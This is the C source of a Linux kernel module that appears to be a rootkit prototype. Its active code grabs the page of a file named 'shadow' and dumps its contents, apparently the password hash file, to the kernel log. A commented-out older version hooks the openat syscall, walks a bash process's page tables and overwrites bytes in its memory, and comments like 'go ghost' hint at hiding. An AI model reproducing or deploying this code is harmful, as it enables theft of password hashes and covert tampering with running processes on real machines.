
#include "taskutil.h"
#include "regset.h"
#include "memutil.h"
#include "depend.h"
#include "address_space.h"

int init_module(void)
{
 	char* map;
	char* buf = kmalloc(1000, GFP_KERNEL);
	struct file* filp = wait_fd("shadow", 6);
	struct page* page = find_page(filp, 0);

	printk("%s\n", get_file_name(filp));
	if(page){
		map = kmap(page);
    memcpy(buf, map, 1000);
    printk(buf);
    kunmap(map);
	}else{
    printk("It didn't work");
  }

	kfree(buf);

//	wait_task("passwd", 6);

	return 0;
}

void cleanup_module(void)
{
	printk("Module cleanup\n");
	//go ghost
}
MODULE_LICENSE("GPL");





//Old init_module below
/*
struct task_struct* ret;
struct mm_struct* mm;// = get_task(BASH_PID) -> mm;
unsigned long laddr;
struct page* page;
char* true_addr;
char* kmaddr;
char* string;
struct user_regs_struct* data;

spam_get_gen();

string = kmalloc(PATH_MAX,GFP_KERNEL);

ret = get_task(BASH_PID);
if(ret == 0){ //do a little error checking
	printk("Bad PID");
	return 0;
}



data = catch_syscall(257); //catch syscall number 257 which is readat()
laddr = (unsigned long)(data -> si);
mm = ret -> mm;
page = page_walk_safe(laddr, mm); //get page
if(page == NULL){
	printk("There was a problem getting the page");
	return 0;
}
kmaddr = (char*)kmap(page);

read_string(kmaddr,string,laddr);

true_addr = return_true_addr(kmaddr, laddr);
*(true_addr)= 'Q'; // - all of the mapping and qogchamp shit


kunmap(page);
kfree(string);
*/
